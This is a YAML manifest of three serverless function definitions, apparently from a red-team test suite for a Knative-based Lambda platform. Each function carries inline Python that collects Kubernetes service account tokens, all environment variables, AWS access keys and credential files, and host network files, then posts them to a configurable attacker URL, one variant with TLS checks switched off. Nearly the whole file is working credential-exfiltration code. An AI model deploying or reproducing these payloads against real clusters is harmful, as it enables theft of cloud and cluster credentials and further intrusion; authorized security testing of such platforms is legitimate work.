# Payload: Data Exfiltrator as LambdaFunction
# ⚠️ AUTHORIZED TESTING ONLY
#
# Collects and exfiltrates sensitive data from Lambda pod.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: payload-exfiltrator-full
  labels:
    redteam: "true"
    exploit: "payload-exfiltrator"
    category: "exfiltration"
    severity: "critical"
  annotations:
    redteam.knative.io/description: "Full data exfiltration - K8s creds, env vars, AWS creds"
    redteam.knative.io/expected-result: "All sensitive data sent to attacker server"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import json
        import base64
        import urllib.request
        import ssl
        
        def read_file_safe(path):
            """Safely read a file, return None if not accessible"""
            try:
                with open(path, 'r') as f:
                    return f.read()
            except:
                return None
        
        def collect_k8s_credentials():
            """Collect Kubernetes service account credentials"""
            sa_path = "/var/run/secrets/kubernetes.io/serviceaccount"
            return {
                "token": read_file_safe(f"{sa_path}/token"),
                "namespace": read_file_safe(f"{sa_path}/namespace"),
                "ca_cert": read_file_safe(f"{sa_path}/ca.crt"),
            }
        
        def collect_environment():
            """Collect all environment variables"""
            return dict(os.environ)
        
        def collect_system_info():
            """Collect system information"""
            return {
                "hostname": os.uname().nodename if hasattr(os, 'uname') else os.environ.get('HOSTNAME'),
                "user": os.environ.get('USER', 'unknown'),
                "home": os.environ.get('HOME', 'unknown'),
                "pwd": os.getcwd(),
                "uid": os.getuid() if hasattr(os, 'getuid') else 'unknown',
                "gid": os.getgid() if hasattr(os, 'getgid') else 'unknown',
            }
        
        def collect_network_info():
            """Collect network configuration"""
            files = ["/etc/hosts", "/etc/resolv.conf"]
            return {f: read_file_safe(f) for f in files}
        
        def collect_aws_credentials():
            """Collect AWS credentials if present"""
            return {
                "aws_access_key_id": os.environ.get("AWS_ACCESS_KEY_ID"),
                "aws_secret_access_key": os.environ.get("AWS_SECRET_ACCESS_KEY"),
                "aws_session_token": os.environ.get("AWS_SESSION_TOKEN"),
                "credentials_file": read_file_safe(os.path.expanduser("~/.aws/credentials")),
            }
        
        def exfiltrate(data, attacker_url, endpoint="data"):
            """Send data to attacker server"""
            try:
                url = f"{attacker_url}/{endpoint}"
                payload = json.dumps(data).encode('utf-8')
                
                req = urllib.request.Request(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/json'}
                )
                
                # Disable SSL verification for testing
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                urllib.request.urlopen(req, timeout=10, context=ctx)
                return True
            except Exception as e:
                return str(e)
        
        def handler(event, context=None):
            """
            Full data exfiltration handler.
            
            Event payload:
              - attacker_url: URL to send data to (required)
              - collect: List of data types to collect (default: all)
                         Options: k8s, env, system, network, aws
            """
            attacker_url = event.get('attacker_url') or os.environ.get('ATTACKER_URL')
            if not attacker_url:
                return {"error": "attacker_url required in event or ATTACKER_URL env var"}
            
            collect_types = event.get('collect', ['k8s', 'env', 'system', 'network', 'aws'])
            
            data = {}
            if 'k8s' in collect_types:
                data['k8s_credentials'] = collect_k8s_credentials()
            if 'env' in collect_types:
                data['environment'] = collect_environment()
            if 'system' in collect_types:
                data['system_info'] = collect_system_info()
            if 'network' in collect_types:
                data['network_info'] = collect_network_info()
            if 'aws' in collect_types:
                data['aws_credentials'] = collect_aws_credentials()
            
            result = exfiltrate(data, attacker_url, "full")
            
            return {
                "status": "exfiltrated" if result is True else "failed",
                "error": result if result is not True else None,
                "collected": list(data.keys())
            }
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
  env:
    - name: ATTACKER_URL
      value: ""  # Set via event or override
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: payload-exfiltrator-k8s-only
  labels:
    redteam: "true"
    exploit: "payload-exfiltrator"
    category: "exfiltration"
    severity: "high"
    variant: "k8s-only"
  annotations:
    redteam.knative.io/description: "Exfiltrate K8s service account token only"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import json
        import urllib.request
        
        def handler(event, context=None):
            """Exfiltrate K8s SA token only"""
            attacker_url = event.get('attacker_url') or os.environ.get('ATTACKER_URL')
            if not attacker_url:
                return {"error": "attacker_url required"}
            
            sa_path = "/var/run/secrets/kubernetes.io/serviceaccount"
            try:
                with open(f"{sa_path}/token", 'r') as f:
                    token = f.read().strip()
                with open(f"{sa_path}/namespace", 'r') as f:
                    namespace = f.read().strip()
                
                data = {
                    "token": token,
                    "namespace": namespace,
                    "hostname": os.environ.get('HOSTNAME', 'unknown')
                }
                
                req = urllib.request.Request(
                    f"{attacker_url}/k8s-token",
                    data=json.dumps(data).encode('utf-8'),
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=10)
                
                return {"status": "exfiltrated", "namespace": namespace}
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: payload-exfiltrator-env-only
  labels:
    redteam: "true"
    exploit: "payload-exfiltrator"
    category: "exfiltration"
    severity: "medium"
    variant: "env-only"
  annotations:
    redteam.knative.io/description: "Exfiltrate environment variables only"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import json
        import urllib.request
        
        def handler(event, context=None):
            """Exfiltrate all environment variables"""
            attacker_url = event.get('attacker_url') or os.environ.get('ATTACKER_URL')
            if not attacker_url:
                return {"error": "attacker_url required"}
            
            try:
                data = {
                    "environment": dict(os.environ),
                    "hostname": os.environ.get('HOSTNAME', 'unknown')
                }
                
                req = urllib.request.Request(
                    f"{attacker_url}/env",
                    data=json.dumps(data).encode('utf-8'),
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=10)
                
                return {"status": "exfiltrated", "env_count": len(data['environment'])}
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
